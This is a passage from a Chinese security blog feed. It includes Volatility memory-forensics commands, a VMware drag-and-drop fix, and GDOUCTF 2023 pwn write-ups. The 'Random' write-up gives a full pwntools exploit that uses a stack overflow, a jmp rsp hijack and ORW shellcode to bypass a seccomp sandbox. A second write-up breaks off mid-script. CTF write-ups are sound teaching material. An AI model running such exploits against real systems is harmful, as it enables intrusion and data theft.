aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看截图"><a href="#查看截图" class="headerlink" title="查看截图"></a>查看截图</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 screenshot --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="获取-cmd-输入"><a href="#获取-cmd-输入" class="headerlink" title="获取 cmd 输入"></a>获取 cmd 输入</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看-cmd-执行的文件"><a href="#查看-cmd-执行的文件" class="headerlink" title="查看 cmd 执行的文件"></a>查看 cmd 执行的文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="提取账户密码"><a href="#提取账户密码" class="headerlink" title="提取账户密码"></a>提取账户密码</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hashpump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscanvol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscan<span class="token operator">|</span><span class="token function">grep</span> ESTABLISHED   <span class="token comment"># 查看已建立的网络连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="查看桌面文件"><a href="#查看桌面文件" class="headerlink" title="查看桌面文件"></a>查看桌面文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Desktop"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从物理机拖到Linux虚拟机中的文件消失了？</title>
      <link href="/posts/41d1faf8.html"/>
      <url>/posts/41d1faf8.html</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><blockquote><p>有时候虚拟机像是 bug 了一样，明明安装了 VMtools，从物理机拖放文件还是会失败：</p><ol><li>如果直接将文件拖进虚拟机会显示 🚫，不妨试试在物理机中将文件复制后粘贴到虚拟机哦（如果还是不行，试试重装 VMtools）</li><li>有时候将文件拖进虚拟机没有显示 🚫，文件也拖放成功了，但文件却并没有出现在对应的文件夹中，当然这就是本文要解决的问题</li></ol></blockquote><p>以物理机往 Ubuntu 虚拟机拖放 <code>CLion</code> 为例：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%861.png" alt="从物理机拖到Linux虚拟机中的文件消失了1.png"></p><p>可以看到，虚拟机没有提示 🚫，拖放操作是没有问题的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%862.png" alt="从物理机拖到Linux虚拟机中的文件消失了2.png"></p><p>拖放后，物理机开始复制文件到 Ubuntu 虚拟机</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%863.png" alt="从物理机拖到Linux虚拟机中的文件消失了3.png"></p><p>但是发现复制结束后，桌面上什么都没有，左上角还有个像卡 bug 了一样的白图标</p><hr><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><blockquote><p>其实，如果在拖放文件到虚拟机的时候没有显示 🚫，并且会有一个 <code>正在将文件 &quot;xxx&quot; 复制到虚拟机</code> 的弹窗，那说明文件是已经成功移到虚拟机了，只是没有移到你想放的文件夹下</p><p><strong>VMware Workstation 会将用户拖放到虚拟机的文件存放在一个叫 <code>drag_and_drop</code> 的文件夹内，只需手动操作一下即可</strong></p></blockquote><hr><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>打开主目录，并在主目录里打开终端（或直接 <code>cd ~</code>）</p><p><code>ls -a</code> 查看主目录下所有文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%864.png" alt="从物理机拖到Linux虚拟机中的文件消失了4.png"></p><p>进到名为 <code>.cache</code> 的隐藏文件夹，可以一路 <code>ls -a</code> 查看</p><p>进到 <code>~/.cache/vmware/drag_and_drop</code> 目录下</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%865.png" alt="从物理机拖到Linux虚拟机中的文件消失了5.png"></p><p>这个目录下有 <code>n</code> 个文件夹，<strong>这些文件夹里存放的就是用户从物理机拖到虚拟机里的东西</strong> <em>（一般最左边的就是最近一次拖放的）</em></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%866.png" alt="从物理机拖到Linux虚拟机中的文件消失了6.png"></p><p>只需将这里面对应的文件移出去即可</p><p>例如我将 <code>CLion</code> 移到主目录下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ./CLion-2022.3.1.tar.gz ~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%867.png" alt="从物理机拖到Linux虚拟机中的文件消失了7.png"></p><p>现在查看主目录的文件夹，就能看到你拖到虚拟机里的文件了</p><hr><h1 id="定期清理拖放文件"><a href="#定期清理拖放文件" class="headerlink" title="定期清理拖放文件"></a>定期清理拖放文件</h1><blockquote><p>因为每次拖放文件到虚拟机都会在 <code>~/.cache/vmware/drag_and_drop</code> 目录下生成一个文件，长此以往特别占用虚拟机的空间</p></blockquote><p>所以我们可以定期删除 <code>~/.cache/vmware/drag_and_drop</code> 目录下的文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.cache/vmware/drag_and_drop <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>对于 Windows 虚拟机：</p><p><code>Win + R</code> 后输入 <code>%temp%</code><br>或者，在文件管理器中打开 <code>C:\Users\用户名\AppData\Local\Temp</code> 路径</p><p>在打开的 Temp 文件夹中有一个名为 <code>vmware-用户名</code> 的文件夹，里面存放的也是拖放到虚拟机中的文件，可以直接删除</p></blockquote><hr><h1 id="设置共享文件夹"><a href="#设置共享文件夹" class="headerlink" title="设置共享文件夹"></a>设置共享文件夹</h1><blockquote><p>如果往虚拟机中拖放文件、复制文件经常出 bug，也可以通过共享文件夹来向虚拟机传送文件<br>但是这种方式将物理机和虚拟机联系到了一起，可能会不安全，不太建议使用</p></blockquote><p>首先开启共享文件夹，<code>虚拟机 --&gt; 设置 --&gt; 选项 --&gt; 共享文件夹</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%868.png" alt="从物理机拖到Linux虚拟机中的文件消失了8.png"></p><p>设置<code>总是启用</code>，<code>添加</code>共享文件夹，选择物理机上的一个文件夹，作为物理机和虚拟机的共享文件夹</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%869.png" alt="从物理机拖到Linux虚拟机中的文件消失了9.png"></p><p>后面的保持默认设置即可</p><p>打开终端，输入 <code>vmware-hgfsclient</code> 检测是否设置成功</p><p>我设置的共享文件夹名字叫 <code>&quot;ShareFolder&quot;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8610.png" alt="从物理机拖到Linux虚拟机中的文件消失了10.png"></p><p>一般来说，Linux 中的共享文件夹在目录 <code>/mnt/hgfs</code> 下<br>也可以在如下位置查看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8611.png" alt="从物理机拖到Linux虚拟机中的文件消失了11.png"></p><p>可以通过把文件放在物理机的 <code>ShareFolder</code> 文件夹下，然后 Ubuntu 虚拟机就可以访问到了</p><p>如果在目录 <code>/mnt/hgfs</code> 下，还是访问不到你放置的文件，或者 <code>cd /mnt/hgfs</code> 后 <code>ls -a</code> 发现什么都没有</p><p>将物理机的共享文件夹挂载到目录 <code>/mnt/hgfs</code> 下，在终端输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vmhgfs-fuse .host:/ /mnt/hgfs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退出目录，重新进到目录 <code>/mnt/hgfs</code> 下</p><p>即可发现正常访问：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8612.png" alt="从物理机拖到Linux虚拟机中的文件消失了12.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8613.png" alt="从物理机拖到Linux虚拟机中的文件消失了13.png"></p><blockquote><p>如果是 Windows 虚拟机，查看共享文件夹就更简单了，可以直接挂载到 <code>&quot;网络&quot;</code> 中，然后进行查看</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8614.png" alt="从物理机拖到Linux虚拟机中的文件消失了14.png"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】Random</title>
      <link href="/posts/15c7efa2.html"/>
      <url>/posts/15c7efa2.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>伪随机数结合沙箱保护，<mark>使用 <code>ORW</code> 绕过沙箱</mark></p></li><li><p><mark>栈上空间不够写入，使用 <code>jmp rsp</code> 劫持返回地址</mark></p></li></ul><hr><p><a href="https://www.nssctf.cn/problem/3722">（2023年4月16日）【GDOUCTF 2023】Random</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM1.png" alt="2023GDOUCTF-RANDOM1.png"></p><p>用 IDA 分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM2.png" alt="2023GDOUCTF-RANDOM2.png"></p><p>这个题也用到了猜伪随机数，猜对之后进到 <code>vulnerable()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM3.png" alt="2023GDOUCTF-RANDOM3.png"></p><p>由于 <code>buf</code> 在栈上的长度是 0x20，这里是可以溢出的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM9.png" alt="2023GDOUCTF-RANDOM9.png"></p><p>看看字符串里有没有什么可以利用的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM5.png" alt="2023GDOUCTF-RANDOM5.png"></p><p>好像并没有</p><p>寻找程序自定义的函数，发现程序通过 <code>sandbox()</code> 函数开启了沙箱保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM4.png" alt="2023GDOUCTF-RANDOM4.png"></p><p>使用 <code>prctl()</code> 方式开启的沙箱</p><ol><li><code>prctl(38, 1LL, 0LL, 0LL, 0LL)</code> 中的 38 表示禁用系统调用</li><li><code>prctl(22，2)</code> 表示设置沙箱规则，从而可以实现改变函数的系统调用</li></ol><blockquote><p>沙箱保护一般都会限制 <code>execve</code> 的系统调用，例如 <code>one_gadget</code> 和 <code>system</code> 调用，使我们不能正常 <code>get shell</code>，只能通过 <code>ROP</code> 的方式调用 <code>open()</code>、<code>read()</code>、<code>write()</code> 的组合方式来获取 flag</p></blockquote><p>使用 <code>seccomp-tools</code> 检查一下程序的沙箱机制</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM6.png" alt="2023GDOUCTF-RANDOM6.png"></p><p><code>if (A != execve) goto 0005</code> 即 <code>return ALLOW</code>，所以程序禁用了 <code>execve</code>，而 <code>system()</code> 需要通过 <code>execve</code> 来实现</p><p>自定义函数中还有一个 <code>haha()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM7.png" alt="2023GDOUCTF-RANDOM7.png"></p><p>给出的是一个汇编指令 <code>__asm &#123; jmp     rsp &#125;</code>，可以跟进获得这条指令所在的地址：<code>0x40094E</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM8.png" alt="2023GDOUCTF-RANDOM8.png"></p><p>因此本题需要使用 ORW<code>（O -- open，R -- read，W -- write）</code> 来绕过沙箱</p><ol><li>首先通过 <code>ctypes</code> 绕过伪随机数校验，跳转到 <code>vulnerable()</code> 函数，但是这里不能通过溢出执行 shellcode 来提权，因为 <code>system()</code> 被沙箱 Ban 了</li><li>由于栈上写入的长度不够，所以得分两次写</li><li>填充字符到 <code>0x28</code> 够到返回地址，用 <code>jmp rsp</code> 劫持返回地址，让其继续向下运行</li><li>找到一个可读可写可执行的地址，用于将读取的 flag 存进去，我这里是 <code>data_address = 0x601000</code> </li><li>然后用 <code>open()</code> 打开 flag，<code>read()</code> 读取 flag，<code>write()</code> 写出 flag，构造 ORW</li></ol><p>但是发现有时候远程的伪随机数打不通，应该是远程靶机的版本问题<br>也可以用爆破的方式绕过：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lease input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    return_str <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'guys'</span> <span class="token keyword">in</span> return_str<span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node1.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28391</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    number <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment"># 执行随机函数</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please input a guess num:\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>number<span class="token punctuation">)</span>srand<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 绕过伪随机数</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x40094E</span>data_address <span class="token operator">=</span> <span class="token number">0x601000</span>  <span class="token comment"># 用vmmap找到一个可读可写的段</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data_address<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 调用read函数，在data_address 0x601000处写入ORW内容</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x601000; call rax'</span><span class="token punctuation">)</span>  <span class="token comment"># call ax寄存器，调用执行data_address 0x601000处的ORW</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>  <span class="token comment"># 溢出到buf栈的返回地址，并将返回地址改成jmp_rsp，继续运行当前rsp后续指令，填写别的返回地址就无法控制程序后面的执行流程了</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30; jmp rsp'</span><span class="token punctuation">)</span>  <span class="token comment"># 此时rsp已经离ORW地址偏移0x30,这里把sp挪回到ORW地址并跳转到ORW</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your door\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ORW <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 打开本地的flag文件</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符3:其它打开的文件，将flag内容写入到data_address + 0x100地址处</span>ORW <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> data_address <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 文件描述符1:输出到屏幕，输出地址data_address + 0x100处存储的flag内容</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>ORW<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{6a3fa38d-f0fe-4d23-960e-b40c015409fc}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-RANDOM10.png" alt="2023GDOUCTF-RANDOM10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> ORW </tag>
            
            <tag> 沙箱绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】真男人下120层</title>
      <link href="/posts/27972470.html"/>
      <url>/posts/27972470.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>使用 <code>ctypes</code> 库生成伪随机数</li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】真男人下120层</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>首先查看文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%821.png" alt="2023GDOUCTF-真男人就下120层1.png"></p><p>用 IDA 查看代码逻辑：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%822.png" alt="2023GDOUCTF-真男人就下120层2.png"></p><p>输出信息有点杂乱，运行程序看一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%823.png" alt="2023GDOUCTF-真男人就下120层3.png"></p><p>这样就看得很清楚了，结合代码，程序大意如下：</p><ol><li>首先根据一些数据生成伪随机数种子</li><li>让我们输入满足 <code>if ( rand() % 4 + 1 != v6 )</code> 条件的 <code>v6</code></li><li>总共有 120 轮这样的校验，如果全部正确就执行 <code>cat_flag()</code> 函数</li></ol><p><code>cat_flag()</code> 函数如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-%E7%9C%9F%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B120%E5%B1%824.png" alt="2023GDOUCTF-真男人就下120层4.png"></p><p>所以接下来思路就很清晰了，按照伪随机数生成的方法构造 exp 重复输入 120 次即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 导入ctypes库使Python可以执行C语言的函数</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/真男人下120层/bin"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28625</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span><span class="token keyword">def</span> <span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>  <span class="token comment"># C运行库</span>    v3 <span class="token operator">=</span> lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>v3<span class="token punctuation">)</span>    v4 <span class="token operator">=</span> lib<span class="token 